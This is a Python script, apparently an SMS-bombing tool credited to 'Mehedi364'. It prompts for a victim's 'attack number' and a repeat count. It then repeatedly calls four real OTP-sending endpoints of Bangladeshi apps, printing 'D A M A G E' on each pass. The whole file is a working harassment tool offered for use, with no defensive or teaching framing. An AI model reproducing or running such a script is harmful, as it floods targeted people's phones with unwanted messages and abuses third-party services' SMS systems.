import requests

from requests.structures import CaseInsensitiveDict

green = '\033[1;32m'

end = '\033[0m'

print (green+"""  ______

                                                                  """+end)

# CVALUE

blue = '\33[94m'

lightblue = '\033[94m'

red = '\033[91m'

white = '\33[97m'

yellow = '\33[93m'

green = '\033[1;32m'

cyan = "\033[96m"

end = '\033[0m'

print ("\033[32m")

print ("	 -!-!Mehedi364 ) ")

print ("""

          

                       

   ╔═════════════════════════════════╗

   ║ AuTHor   : Mehedi ツ           ║

   ║ FaCeBooK : mehedijt.jt║

   ║ GitHuB   : mehedi364            ║

   ╚═════════════════════════════════╝

       

 

  

  

""")

number  = str(input("[>] Input your attack namber: "))

amount = int(input("[>] Enter Your Amount: "))

 

url1 = "http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-"+number+"/operator-Robi/send"

url2 = "http://45.114.85.19:8080/v3/otp/send?msisdn=88"+number

url3 = "https://ss.binge.buzz/otp/send/login"

headers3 = CaseInsensitiveDict()

headers3["Content-Type"] = "application/x-www-form-urlencoded"

data3 = "phone="+number

url4 = "https://api.maya-apa.com/api/v5/app/send_otp?phone=88"+number+"&device_id=df180efb23ee233d&source=app&lat=0.00&long=0.00"

headers4 = CaseInsensitiveDict()

headers4["Content-Type"] = "application/json"

headers4["Content-Length"] = "0"

for i in range(amount):

	try:

		resp1 = requests.get(url1)

		

		resp2 = requests.get(url2)

		

		resp3 = requests.post(url3, headers=headers3, data=data3)

		

		resp4 = requests.post(url4, headers=headers4)

		

		print(str (i+1)+" D A M A G E  \n")

	

	except:

		print ("Please Make Sure Your Internet Connection")#
